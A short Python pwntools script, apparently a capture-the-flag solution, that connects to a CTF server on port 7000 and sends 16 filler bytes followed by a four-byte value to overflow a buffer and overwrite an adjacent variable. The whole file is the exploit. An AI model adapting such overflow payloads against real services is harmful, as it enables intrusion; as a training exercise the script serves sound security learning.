from pwn import *

conn = remote('ctf21.softwaresecurity.no', 7000)
first_send = conn.recv(1024)
print(first_send)
#line = b'a' * 16  + b'\x79\xbe\xef\x8b'
line = b'a'*16 + b'\x8b\xef\xbe\x79'
conn.sendline(line)

print(conn.recvuntil(" "))
# print(conn.recvline())
# print(conn.recvline())

